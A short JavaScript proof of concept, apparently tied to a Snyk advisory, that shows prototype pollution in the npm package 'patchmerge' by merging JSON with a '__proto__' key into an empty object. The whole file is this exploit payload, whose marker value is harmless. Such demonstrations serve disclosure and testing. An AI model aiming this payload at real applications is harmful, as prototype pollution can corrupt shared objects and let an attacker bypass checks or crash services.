//https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585
 
  var patchMerge = require("patchmerge");
  var obj = {};
   
  patchMerge(obj, JSON.parse('{"__proto__": { "polluted": "yes" }}'));
// End of file
